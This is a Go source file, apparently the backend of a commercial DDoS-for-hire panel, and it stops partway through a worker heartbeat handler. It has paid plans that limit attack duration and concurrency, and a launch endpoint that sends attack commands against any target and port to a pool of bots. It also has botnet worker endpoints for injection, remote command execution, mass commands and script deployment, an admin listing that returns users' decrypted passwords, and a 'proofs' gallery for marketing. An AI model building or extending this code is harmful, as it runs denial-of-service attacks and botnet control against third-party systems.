package main

import (
	"embed"
	"encoding/json"
	"fmt"
	"io"
	"io/fs"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

//go:embed all:out
var staticFiles embed.FS

var planUpdateMu sync.Mutex

func NewWebMux() http.Handler {
	mux := http.NewServeMux()

	subFs, err := fs.Sub(staticFiles, "out")
	if err != nil {
		log.Fatal(err)
	}

	r := func(pattern string, handler func(http.ResponseWriter, *http.Request)) {
		mux.HandleFunc("/api"+pattern, handler)
		mux.HandleFunc("/api/v1"+pattern, handler)
	}
	r("/login", handleLogin)
	r("/register", handleRegister)
	r("/verify-token", handleVerifyToken)
	r("/profile", handleProfile)
	r("/dashboard", handleDashboard)
	r("/launch", handleLaunch)
	r("/ongoing-attacks", handleOngoingAttacks)
	r("/stop", handleStopAttack)

	r("/users", handleAdminUsersList)
	r("/users/", handleAdminUsersUpdate)
	r("/add-user", handleAdminAddUser)
	r("/remove-user/", handleAdminDeleteUser)

	r("/plans", handlePlans)
	r("/plans/", handlePlansUpdate)

	r("/methods", handleMethods)
	r("/methods/", handleMethodsUpdate)

	r("/servers", handleServers)
	r("/servers/", handleServersUpdate)
	r("/add-server", handleServers)

	r("/generate-key", handleGenerateKey)
	r("/proofs", handleProofs)
	r("/proofs/", handleProofsDelete)
	r("/broadcasts", handleBroadcasts)
	r("/broadcasts/", handleBroadcastsDelete)
	r("/upload", handleUpload)
	r("/workers", handleWorkers)
	r("/workers/heartbeat", handleWorkerHeartbeat)
	r("/workers/inject", handleWorkerInject)
	r("/workers/register", handleWorkerRegister)
	r("/workers/commands/", handleWorkerCommands)
	r("/workers/send-command", handleWorkerSendCommand)
	r("/scripts", handleUploadScript)
	r("/deploy-script", handleDeployScript)
	r("/methods/create-from-script", handleMethodFromScript)
	r("/workers/rce", handleWorkerRCE)
	r("/workers/result", handleWorkerResult)
	r("/workers/result/", handleGetWorkerResult)
	r("/workers/mass", handleMassCommand)
	r("/github-config", handleGitHubConfig)
	r("/generate-worker", handleGenerateWorkerScript)

	mux.Handle("/scripts/", http.StripPrefix("/scripts/", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.HasSuffix(r.URL.Path, "/") || r.URL.Path == "" {
			http.NotFound(w, r)
			return
		}
		http.FileServer(http.Dir("scripts")).ServeHTTP(w, r)
	})))

	mux.Handle("/uploads/", http.StripPrefix("/uploads/", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.HasSuffix(r.URL.Path, "/") || r.URL.Path == "" {
			http.NotFound(w, r)
			return
		}
		http.FileServer(http.Dir("uploads")).ServeHTTP(w, r)
	})))

	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		path := strings.TrimPrefix(r.URL.Path, "/")
		if path == "" {
			path = "index.html"
		}
		data, err := fs.ReadFile(subFs, path)
		if err != nil && !strings.HasPrefix(path, "_next") {
			path = path + ".html"
			data, err = fs.ReadFile(subFs, path)
		}
		if err != nil {
			path = "index.html"
			data, err = fs.ReadFile(subFs, path)
		}
		if err != nil {
			http.NotFound(w, r)
			return
		}
		contentType := "text/html"
		if strings.HasSuffix(path, ".js") {
			contentType = "application/javascript"
		} else if strings.HasSuffix(path, ".css") {
			contentType = "text/css"
		} else if strings.HasSuffix(path, ".svg") {
			contentType = "image/svg+xml"
		} else if strings.HasSuffix(path, ".png") {
			contentType = "image/png"
		} else if strings.HasSuffix(path, ".json") {
			contentType = "application/json"
		} else if strings.HasSuffix(path, ".txt") {
			contentType = "text/plain"
		}
		w.Header().Set("Content-Type", contentType)
		w.Write(data)
	})

	return withSecurity(mux)
}

var (
	rateLimiters sync.Map
	rateMu       sync.Mutex
)

func withSecurity(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("X-Frame-Options", "DENY")
		w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
		w.Header().Set("Content-Security-Policy", "default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob: https:; media-src 'self' https:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src 'self' *")

		if origin := r.Header.Get("Origin"); origin != "" {
			allowed := false
			for _, a := range appConfig.Security.AllowedOrigins {
				if a == "*" || a == origin {
					allowed = true
					break
				}
			}
			if allowed {
				w.Header().Set("Access-Control-Allow-Origin", origin)
				w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
				w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
				w.Header().Set("Access-Control-Allow-Credentials", "true")
			}
		}

		if r.Method == "OPTIONS" {
			w.WriteHeader(204)
			return
		}

		rateLimit := appConfig.Security.RateLimitPerMin
		if rateLimit > 0 && (strings.HasPrefix(r.URL.Path, "/api/login") || strings.HasPrefix(r.URL.Path, "/api/register") || strings.HasPrefix(r.URL.Path, "/api/v1/login") || strings.HasPrefix(r.URL.Path, "/api/v1/register")) {
			ip := r.RemoteAddr
			rateMu.Lock()
			v, _ := rateLimiters.LoadOrStore(ip, &rateBucket{limit: rateLimit})
			b := v.(*rateBucket)
			rateMu.Unlock()
			if !b.allow() {
				jsonError(w, "rate limit exceeded", 429)
				return
			}
		}

		next.ServeHTTP(w, r)
	})
}

type rateBucket struct {
	limit    int
	count    int
	lastTick time.Time
	mu       sync.Mutex
}

func (b *rateBucket) allow() bool {
	b.mu.Lock()
	defer b.mu.Unlock()
	now := time.Now()
	if now.Sub(b.lastTick) > time.Minute {
		b.count = 0
		b.lastTick = now
	}
	if b.count >= b.limit {
		return false
	}
	b.count++
	return true
}

func getTokenUser(r *http.Request) (User, bool) {
	auth := r.Header.Get("Authorization")
	if auth == "" || !strings.HasPrefix(auth, "Bearer ") {
		return User{}, false
	}
	token := strings.TrimPrefix(auth, "Bearer ")
	return getUserByToken(token)
}

func jsonError(w http.ResponseWriter, msg string, code int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	json.NewEncoder(w).Encode(map[string]string{"detail": msg})
}

func jsonSuccess(w http.ResponseWriter, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(data)
}

func handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		jsonError(w, "method not allowed", 405)
		return
	}
	r.ParseForm()
	username := r.FormValue("username")
	password := r.FormValue("password")

	user, ok := getUserByUsername(username)
	if !ok || !checkPassword(password, user.Password) {
		jsonError(w, "Invalid username or password", 401)
		return
	}

	token := generateToken()
	SaveSessionToken(token, user.Username)

	jsonSuccess(w, map[string]interface{}{
		"access_token": token,
		"admin":        user.Rule == "Admin",
	})
}

func handleRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		jsonError(w, "method not allowed", 405)
		return
	}
	r.ParseForm()
	username := r.FormValue("username")
	email := r.FormValue("email")
	password := r.FormValue("password")

	if username == "" || email == "" || password == "" {
		jsonError(w, "All fields are required", 400)
		return
	}

	if _, ok := getUserByUsername(username); ok {
		jsonError(w, "Username already exists", 400)
		return
	}

	user := User{
		ID:             generateID(),
		Username:       username,
		Email:          email,
		Password:       hashPassword(password),
		Rule:           "User",
		Plan:           "Free",
		JoinDate:       time.Now().Format(time.RFC3339),
		ExpirationDate: "",
		MaxConcurrents: 1,
		MaxSeconds:     60,
		APIKey:         generateToken(),
	}
	SaveUser(user)

	jsonSuccess(w, map[string]bool{"success": true})
}

func handleVerifyToken(w http.ResponseWriter, r *http.Request) {
	if _, ok := getTokenUser(r); ok {
		jsonSuccess(w, map[string]bool{"valid": true})
		return
	}
	jsonError(w, "Invalid token", 401)
}

func handleProfile(w http.ResponseWriter, r *http.Request) {
	user, ok := getTokenUser(r)
	if !ok {
		jsonError(w, "Unauthorized", 401)
		return
	}

	if r.Method == "PUT" {
		var body struct {
			AvatarURL    string `json:"avatar_url"`
			Password     string `json:"password"`
			NewPassword  string `json:"new_password"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			jsonError(w, "Invalid request body", 400)
			return
		}
		if body.AvatarURL != "" {
			user.AvatarURL = body.AvatarURL
		}
		if body.NewPassword != "" {
			if !checkPassword(body.Password, user.Password) {
				jsonError(w, "Current password is incorrect", 403)
				return
			}
			user.Password = hashPassword(body.NewPassword)
		}
		SaveUser(user)
		jsonSuccess(w, map[string]string{"status": "ok"})
		return
	}

	// reload from users map for freshest data (avatar, plan, etc.)
	if u, ok := getUserByUsername(user.Username); ok {
		user = u
	}

	p := Plan{}
	v, _ := plans.Load(user.Plan)
	if v != nil {
		p = v.(Plan)
	}

	jsonSuccess(w, map[string]interface{}{
		"id":              user.ID,
		"username":        user.Username,
		"email":           user.Email,
		"plan":            user.Plan,
		"rule":            user.Rule,
		"join_date":       user.JoinDate,
		"max_concurrents": p.MaxConcurrents,
		"max_seconds":     p.MaxSeconds,
		"expiration_date": user.ExpirationDate,
		"api_key":         user.APIKey,
		"avatar_url":      user.AvatarURL,
	})
}

func handleDashboard(w http.ResponseWriter, r *http.Request) {
	if _, ok := getTokenUser(r); !ok {
		jsonError(w, "Unauthorized", 401)
		return
	}

	attacksData := []map[string]interface{}{}
	for i := 6; i >= 0; i-- {
		day := time.Now().AddDate(0, 0, -i)
		attacksData = append(attacksData, map[string]interface{}{
			"name":    day.Format("Mon"),
			"attacks": 0,
		})
	}

	userCount := 0
	users.Range(func(_, _ interface{}) bool {
		userCount++
		return true
	})

	jsonSuccess(w, map[string]interface{}{
		"active_servers":      getBotCount(),
		"total_attacks":       0,
		"running_attacks":     getActiveAttackCount(),
		"registered_users":    userCount,
		"attacks_last_7_days": attacksData,
	})
}

func handleServers(w http.ResponseWriter, r *http.Request) {
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}

	if r.Method == "GET" {
		servers := []BotConnection{}
		botConnections.Range(func(_, v interface{}) bool {
			servers = append(servers, v.(BotConnection))
			return true
		})
		jsonSuccess(w, servers)
		return
	}

	if r.Method == "POST" {
		var body struct {
			IP   string `json:"ip"`
			Arch string `json:"arch"`
			CPU  int    `json:"cpu"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			jsonError(w, "Invalid request body", 400)
			return
		}
		if body.IP == "" {
			jsonError(w, "IP is required", 400)
			return
		}
		bot := BotConnection{
			ID:       generateID(),
			IP:       body.IP,
			Arch:     body.Arch,
			CPU:      body.CPU,
			Username: user.Username,
			Online:   true,
			LastSeen: time.Now(),
		}
		storage.SaveBot(bot)
		jsonSuccess(w, bot)
		return
	}

	jsonError(w, "method not allowed", 405)
}

func handleServersUpdate(w http.ResponseWriter, r *http.Request) {
	if r.Method != "PATCH" {
		jsonError(w, "method not allowed", 405)
		return
	}
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}
	id := strings.TrimPrefix(r.URL.Path, "/api/servers/")
	id = strings.TrimPrefix(id, "/api/v1/servers/")
	if id == "" {
		jsonError(w, "Server ID required", 400)
		return
	}
	v, ok := botConnections.Load(id)
	if !ok {
		jsonError(w, "Server not found", 404)
		return
	}
	bot := v.(BotConnection)
	var body struct {
		IP     *string `json:"ip"`
		Arch   *string `json:"arch"`
		CPU    *int    `json:"cpu"`
		Online *bool   `json:"online"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		jsonError(w, "Invalid request body", 400)
		return
	}
	if body.IP != nil { bot.IP = *body.IP }
	if body.Arch != nil { bot.Arch = *body.Arch }
	if body.CPU != nil { bot.CPU = *body.CPU }
	if body.Online != nil {
		bot.Online = *body.Online
		bot.LastSeen = time.Now()
	}
	storage.SaveBot(bot)
	jsonSuccess(w, bot)
}

func handleGenerateKey(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		jsonError(w, "method not allowed", 405)
		return
	}
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}
	var body struct {
		Username string `json:"username"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		jsonError(w, "Invalid request body", 400)
		return
	}
	target, ok := getUserByUsername(body.Username)
	if !ok {
		jsonError(w, "User not found", 404)
		return
	}
	target.APIKey = generateToken()
	SaveUser(target)
	jsonSuccess(w, map[string]string{"api_key": target.APIKey, "username": target.Username})
}

func handleProofs(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		ps, err := storage.GetAllProofs()
		if err != nil { jsonError(w, "internal error", 500); return }
		jsonSuccess(w, ps)
		return
	}

	user, ok := getTokenUser(r)
	if !ok {
		jsonError(w, "Unauthorized", 401)
		return
	}

	if r.Method == "POST" {
		if user.Rule != "Admin" {
			jsonError(w, "Unauthorized", 403)
			return
		}
		var body struct {
			Type    string `json:"type"`
			URL     string `json:"url"`
			Caption string `json:"caption"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			jsonError(w, "Invalid request body", 400)
			return
		}
		if body.Type != "image" && body.Type != "video" {
			jsonError(w, "Type must be 'image' or 'video'", 400)
			return
		}
		p := Proof{
			ID:        generateID(),
			Type:      body.Type,
			URL:       body.URL,
			Caption:   body.Caption,
			CreatedBy: user.Username,
			CreatedAt: time.Now(),
		}
		storage.SaveProof(p)
		jsonSuccess(w, p)
		return
	}

	jsonError(w, "method not allowed", 405)
}

func handleProofsDelete(w http.ResponseWriter, r *http.Request) {
	if r.Method != "DELETE" {
		jsonError(w, "method not allowed", 405)
		return
	}
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}
	id := strings.TrimPrefix(r.URL.Path, "/api/v1/proofs/")
	if id == r.URL.Path {
		id = strings.TrimPrefix(r.URL.Path, "/api/proofs/")
	}
	storage.DeleteProof(id)
	jsonSuccess(w, map[string]bool{"success": true})
}

func handleUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		jsonError(w, "method not allowed", 405)
		return
	}
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 10<<20)
	r.ParseMultipartForm(10 << 20)
	file, handler, err := r.FormFile("file")
	if err != nil {
		jsonError(w, "file is required", 400)
		return
	}
	defer file.Close()

	ext := strings.ToLower(filepath.Ext(handler.Filename))
	if ext != ".jpg" && ext != ".jpeg" && ext != ".png" && ext != ".gif" && ext != ".webp" && ext != ".mp4" && ext != ".webm" && ext != ".ogg" {
		jsonError(w, "invalid file type (allowed: jpg, png, gif, webp, mp4, webm, ogg)", 400)
		return
	}
	name := generateID() + ext
	os.MkdirAll("uploads", 0755)
	dst, err := os.Create("uploads/" + name)
	if err != nil {
		jsonError(w, "failed to save file", 500)
		return
	}
	defer dst.Close()
	io.Copy(dst, file)

	url := "/uploads/" + name
	jsonSuccess(w, map[string]string{"url": url})
}

func handleBroadcasts(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		user, _ := getTokenUser(r)
		var bs []Broadcast
		var err error
		if user.Rule == "Admin" {
			bs, err = storage.GetAllBroadcasts()
		} else {
			bs, err = storage.GetActiveBroadcasts()
		}
		if err != nil {
			jsonError(w, "internal error", 500)
			return
		}
		jsonSuccess(w, bs)
		return
	}

	if r.Method == "POST" {
		user, ok := getTokenUser(r)
		if !ok || user.Rule != "Admin" {
			jsonError(w, "Unauthorized", 403)
			return
		}
		var body struct {
			Text     string `json:"text"`
			EndTime  string `json:"end_time"`
			MediaURL string `json:"media_url"`
			Caption  string `json:"caption"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			jsonError(w, "Invalid request body", 400)
			return
		}
		if body.Text == "" {
			jsonError(w, "text is required", 400)
			return
		}
		b := Broadcast{
			ID:        generateID(),
			Text:      body.Text,
			EndTime:   body.EndTime,
			MediaURL:  body.MediaURL,
			Caption:   body.Caption,
			CreatedBy: user.Username,
			CreatedAt: time.Now(),
		}
		storage.SaveBroadcast(b)
		jsonSuccess(w, b)
		return
	}

	jsonError(w, "method not allowed", 405)
}

func handleBroadcastsDelete(w http.ResponseWriter, r *http.Request) {
	if r.Method != "DELETE" {
		jsonError(w, "method not allowed", 405)
		return
	}
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}
	id := strings.TrimPrefix(r.URL.Path, "/api/v1/broadcasts/")
	if id == r.URL.Path {
		id = strings.TrimPrefix(r.URL.Path, "/api/broadcasts/")
	}
	storage.DeleteBroadcast(id)
	jsonSuccess(w, map[string]bool{"success": true})
}

func handleMethods(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		methods := []Method{}
		methodList.Range(func(_, v interface{}) bool {
			methods = append(methods, v.(Method))
			return true
		})
		jsonSuccess(w, methods)
		return
	}

	if r.Method == "POST" {
		user, ok := getTokenUser(r)
		if !ok || user.Rule != "Admin" {
			jsonError(w, "Unauthorized", 403)
			return
		}
		var m Method
		if err := json.NewDecoder(r.Body).Decode(&m); err != nil {
			jsonError(w, "Invalid request body", 400)
			return
		}
		if _, exists := methodList.Load(m.Method); exists {
			jsonError(w, "Method already exists", 409)
			return
		}
		if m.Concurrents == 0 {
			m.Concurrents = 1
		}
		SaveMethod(m)
		jsonSuccess(w, map[string]bool{"success": true})
		return
	}

	jsonError(w, "method not allowed", 405)
}

func handleMethodsUpdate(w http.ResponseWriter, r *http.Request) {
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}

	methodName := strings.TrimPrefix(r.URL.Path, "/api/v1/methods/")
	if methodName == r.URL.Path {
		methodName = strings.TrimPrefix(r.URL.Path, "/api/methods/")
	}

	if r.Method == "PUT" {
		var m Method
		if err := json.NewDecoder(r.Body).Decode(&m); err != nil {
			jsonError(w, "Invalid request body", 400)
			return
		}
		m.Method = methodName
		if m.Concurrents == 0 {
			m.Concurrents = 1
		}
		SaveMethod(m)
		jsonSuccess(w, map[string]bool{"success": true})
		return
	}

	if r.Method == "DELETE" {
		hasAttacks := false
		ongoingAttacks.Range(func(_, v interface{}) bool {
			if v.(Attack).Method == methodName {
				hasAttacks = true
				return false
			}
			return true
		})
		if hasAttacks {
			jsonError(w, "Method has ongoing attacks", 409)
			return
		}
		deleteMethod(methodName)
		jsonSuccess(w, map[string]bool{"success": true})
		return
	}

	jsonError(w, "method not allowed", 405)
}

func handleLaunch(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		jsonError(w, "method not allowed", 405)
		return
	}
	user, ok := getTokenUser(r)
	if !ok {
		jsonError(w, "Unauthorized", 401)
		return
	}
	r.ParseForm()
	method := r.FormValue("method")
	target := r.FormValue("target")
	port := r.FormValue("port")
	timeStr := r.FormValue("time")
	layer := r.FormValue("layer")
	concurrentsStr := r.FormValue("concurrents")
	rpcStr := r.FormValue("rpc")
	proxyStr := r.FormValue("proxy")
	flagsStr := r.FormValue("flags")

	if target == "" {
		jsonError(w, "Target is required", 400)
		return
	}

	methodV, methodExists := methodList.Load(method)
	if !methodExists {
		jsonError(w, "Invalid method", 400)
		return
	}
	methodDef := methodV.(Method)

	if methodDef.Premium {
		planV, planExists := plans.Load(user.Plan)
		if !planExists || !planV.(Plan).Premium {
			jsonError(w, "Premium method requires a premium plan", 403)
			return
		}
	}

	duration := 30
	if timeStr != "" {
		fmt.Sscanf(timeStr, "%d", &duration)
	}

	if duration > user.MaxSeconds {
		duration = user.MaxSeconds
	}
	if duration < 1 {
		duration = 1
	}

	concurrents := 1
	if concurrentsStr != "" {
		fmt.Sscanf(concurrentsStr, "%d", &concurrents)
	}
	if concurrents > user.MaxConcurrents {
		concurrents = user.MaxConcurrents
	}
	if concurrents < 1 {
		concurrents = 1
	}

	rpc := 0
	if rpcStr != "" {
		fmt.Sscanf(rpcStr, "%d", &rpc)
	}

	attackID := generateID()
	targetFull := target
	if port != "" {
		targetFull = target + ":" + port
	}
	attack := Attack{
		ID:            attackID,
		Target:        targetFull,
		Method:        method,
		Layer:         layer,
		TimeTotal:     duration,
		TimeRemaining: duration,
		Concurrents:   concurrents,
		Rpc:           rpc,
		Username:      user.Username,
		StartTime:     time.Now(),
		Port:          port,
		Proxy:         proxyStr == "1" || proxyStr == "true",
	}
	SaveOngoingAttack(attack)

	cmd := AttackCommand{
		AttackID:    attackID,
		Method:      method,
		Target:      target,
		Port:        port,
		Time:        duration,
		Concurrents: concurrents,
		Rpc:         rpc,
		Layer:       layer,
		ScriptName:  methodDef.ScriptName,
		Flags:       flagsStr,
	}
	if cmd.Flags == "" {
		cmd.Flags = methodDef.Flags
	}
	cmd.Publish()

	go func() {
		for i := duration; i > 0; i-- {
			time.Sleep(1 * time.Second)
			if v, ok := ongoingAttacks.Load(attackID); ok {
				a := v.(Attack)
				a.TimeRemaining = i - 1
				SaveOngoingAttack(a)
			}
		}
		deleteOngoingAttack(attackID)
	}()

	ongoing := 0
	ongoingAttacks.Range(func(_, v interface{}) bool {
		if a, ok := v.(Attack); ok && a.Username == user.Username && a.TimeRemaining > 0 {
			ongoing++
		}
		return true
	})

	jsonSuccess(w, map[string]interface{}{
		"success":   true,
		"ongoing":   ongoing,
		"attack_id": attackID,
	})
}

func handleOngoingAttacks(w http.ResponseWriter, r *http.Request) {
	user, ok := getTokenUser(r)
	if !ok {
		jsonError(w, "Unauthorized", 401)
		return
	}

	attacks := []Attack{}
	ongoingAttacks.Range(func(_, v interface{}) bool {
		a := v.(Attack)
		if a.Username == user.Username && a.TimeRemaining > 0 {
			attacks = append(attacks, a)
		}
		return true
	})

	jsonSuccess(w, map[string]interface{}{
		"status":  "success",
		"attacks": attacks,
	})
}

func handleStopAttack(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		jsonError(w, "method not allowed", 405)
		return
	}
	user, ok := getTokenUser(r)
	if !ok {
		jsonError(w, "Unauthorized", 401)
		return
	}
	r.ParseForm()
	attackID := r.FormValue("attack_id")

	if v, ok := ongoingAttacks.Load(attackID); ok {
		a := v.(Attack)
		if a.Username == user.Username || user.Rule == "Admin" {
			stopCmd := StopCommand{AttackID: attackID}
			stopCmd.Publish()
			deleteOngoingAttack(attackID)
			jsonSuccess(w, map[string]bool{"success": true})
			return
		}
		jsonError(w, "Not your attack", 403)
		return
	}
	jsonError(w, "Attack not found", 404)
}

func handlePlans(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		planList := []Plan{}
		plans.Range(func(_, v interface{}) bool {
			planList = append(planList, v.(Plan))
			return true
		})
		jsonSuccess(w, planList)
		return
	}

	if r.Method == "POST" {
		user, ok := getTokenUser(r)
		if !ok || user.Rule != "Admin" {
			jsonError(w, "Unauthorized", 403)
			return
		}
		var p Plan
		if err := json.NewDecoder(r.Body).Decode(&p); err != nil {
			jsonError(w, "Invalid request body", 400)
			return
		}
		if _, exists := plans.Load(p.Name); exists {
			jsonError(w, "Plan already exists", 409)
			return
		}
		SavePlan(p)
		jsonSuccess(w, map[string]bool{"success": true})
		return
	}

	jsonError(w, "method not allowed", 405)
}

func handlePlansUpdate(w http.ResponseWriter, r *http.Request) {
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}

	planName := strings.TrimPrefix(r.URL.Path, "/api/v1/plans/")
	if planName == r.URL.Path {
		planName = strings.TrimPrefix(r.URL.Path, "/api/plans/")
	}

	if r.Method == "PUT" {
		var p Plan
		if err := json.NewDecoder(r.Body).Decode(&p); err != nil {
			jsonError(w, "Invalid request body", 400)
			return
		}
		p.Name = planName
		SavePlan(p)
		jsonSuccess(w, map[string]bool{"success": true})
		return
	}

	if r.Method == "DELETE" {
		hasUsers := false
		users.Range(func(_, v interface{}) bool {
			if v.(User).Plan == planName {
				hasUsers = true
				return false
			}
			return true
		})
		if hasUsers {
			jsonError(w, "Plan is assigned to users", 409)
			return
		}
		deletePlan(planName)
		jsonSuccess(w, map[string]bool{"success": true})
		return
	}

	jsonError(w, "method not allowed", 405)
}

func handleAdminUsersList(w http.ResponseWriter, r *http.Request) {
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}

	userList := []User{}
	users.Range(func(_, v interface{}) bool {
		u := v.(User)
		u.Password = decryptPassword(u.Password)
		userList = append(userList, u)
		return true
	})
	jsonSuccess(w, userList)
}

func handleAdminUsersUpdate(w http.ResponseWriter, r *http.Request) {
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}

	userID := strings.TrimPrefix(r.URL.Path, "/api/v1/users/")
	if userID == r.URL.Path {
		userID = strings.TrimPrefix(r.URL.Path, "/api/users/")
	}

	if r.Method == "PUT" {
		var u User
		if err := json.NewDecoder(r.Body).Decode(&u); err != nil {
			jsonError(w, "Invalid request body", 400)
			return
		}

		var targetUser User
		var targetUsername string
		users.Range(func(k, v interface{}) bool {
			if v.(User).ID == userID {
				targetUser = v.(User)
				targetUsername = k.(string)
				return false
			}
			return true
		})

		if targetUsername == "" {
			jsonError(w, "User not found", 404)
			return
		}

		newUsername := u.Username
		if newUsername == "" {
			newUsername = targetUser.Username
		}
		targetUser.Username = newUsername
		targetUser.Email = u.Email
		targetUser.Rule = u.Rule
		targetUser.Plan = u.Plan
		if u.Password != "" {
			targetUser.Password = hashPassword(u.Password)
		}
		if u.ExpirationDate != "" {
			targetUser.ExpirationDate = u.ExpirationDate
		}

		if planV, ok := plans.Load(targetUser.Plan); ok {
			p := planV.(Plan)
			targetUser.MaxConcurrents = p.MaxConcurrents
			targetUser.MaxSeconds = p.MaxSeconds
		}

		if targetUsername != targetUser.Username {
			users.Delete(targetUsername)
		}
		SaveUser(targetUser)
		jsonSuccess(w, map[string]bool{"success": true})
		return
	}

	jsonError(w, "method not allowed", 405)
}

func handleAdminDeleteUser(w http.ResponseWriter, r *http.Request) {
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}

	userID := strings.TrimPrefix(r.URL.Path, "/api/v1/remove-user/")
	if userID == r.URL.Path {
		userID = strings.TrimPrefix(r.URL.Path, "/api/remove-user/")
	}

	if r.Method == "DELETE" {
		var targetUsername string
		users.Range(func(k, v interface{}) bool {
			if v.(User).ID == userID {
				targetUsername = k.(string)
				return false
			}
			return true
		})

		if targetUsername == "" {
			jsonError(w, "User not found", 404)
			return
		}

		adminCount := 0
		users.Range(func(_, v interface{}) bool {
			if v.(User).Rule == "Admin" {
				adminCount++
			}
			return true
		})
		v, _ := users.Load(targetUsername)
		isAdmin := v.(User).Rule == "Admin"
		if isAdmin && adminCount <= 1 {
			jsonError(w, "Cannot delete the last admin", 403)
			return
		}

		deleteUser(targetUsername)
		jsonSuccess(w, map[string]bool{"success": true})
		return
	}

	jsonError(w, "method not allowed", 405)
}

func handleAdminAddUser(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		jsonError(w, "method not allowed", 405)
		return
	}
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}

	var u User
	if err := json.NewDecoder(r.Body).Decode(&u); err != nil {
		jsonError(w, "Invalid request body", 400)
		return
	}

	u.ID = generateID()

	if _, exists := users.Load(u.Username); exists {
		jsonError(w, "Username already exists", 409)
		return
	}

	u.Password = hashPassword(u.Password)
	u.JoinDate = time.Now().Format(time.RFC3339)
	u.APIKey = generateToken()

	if u.Rule == "" {
		u.Rule = "User"
	}

	if pv, ok := plans.Load(u.Plan); ok {
		p := pv.(Plan)
		u.MaxConcurrents = p.MaxConcurrents
		u.MaxSeconds = p.MaxSeconds
	}

	SaveUser(u)
	jsonSuccess(w, map[string]bool{"success": true})
}

func handleAdminAddPlan(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		jsonError(w, "method not allowed", 405)
		return
	}
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}

	var p Plan
	if err := json.NewDecoder(r.Body).Decode(&p); err != nil {
		jsonError(w, "Invalid request body", 400)
		return
	}
	if _, exists := plans.Load(p.Name); exists {
		jsonError(w, "Plan already exists", 409)
		return
	}
	SavePlan(p)
	jsonSuccess(w, map[string]bool{"success": true})
}

// ─── Worker Management ───────────────────────────────────────────────

func handleWorkers(w http.ResponseWriter, r *http.Request) {
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}

	if r.Method == "GET" {
		ws, err := storage.GetAllWorkers()
		if err != nil {
			jsonError(w, "internal error", 500)
			return
		}
		jsonSuccess(w, ws)
		return
	}

	jsonError(w, "method not allowed", 405)
}

func handleWorkerHeartbeat(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		jsonError(w, "method not allowed", 405)
		return
	}

	var body struct {
		WorkerID   string `json:"worker_id"`
		PID        int    `json:"pid"`
		Port       int    `json:"port"`
		Status     string `json:"status"`
		BinaryPath string `json:"binary_path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		jsonError(w, "Invalid request body", 400)
		return
	}

	if body.WorkerID == "" {
		jsonError(w, "worker_id is required", 400)
		return
	}

	wkr, found := storage.GetWorkerByID(body.WorkerID)
	if !found {
		jsonError(w, "Worker not found", 404)
		return
	}

	wkr.PID = body.PID
	wkr.Port = body.Port
	if body.Status != "" {
		wkr.Status = body.Status
	}
